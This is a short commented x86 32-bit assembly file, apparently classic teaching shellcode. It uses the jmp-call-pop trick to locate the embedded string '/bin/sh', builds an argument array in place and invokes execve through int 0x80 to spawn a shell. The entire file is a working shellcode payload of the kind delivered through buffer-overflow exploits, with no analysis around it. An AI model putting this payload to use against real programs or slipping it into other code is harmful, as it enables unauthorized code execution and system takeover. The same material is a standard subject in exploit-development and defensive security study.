section .text
  global _start
    _start:
	BITS 32
	jmp short two
    one:
 	pop ebx ;pointer to the string in 2
 	xor eax, eax ; clears eax
 	mov [ebx+7], al ; inserts terminating character
 	mov [ebx+8], ebx; saves address of string in ebx + 8 
 	mov [ebx+12], eax; inserts 4 terminating characters in ebx + 12
 	lea ecx, [ebx+8]; loads the arg arr 
 	xor edx, edx; clears edx, no env variables
 	mov al,  0x0b; sets eax to syscall #, 11
 	int 0x80 ;kernel interrupt with interrupt # 80
     two:
 	call one
 	db '/bin/sh*AAAABBBB' 
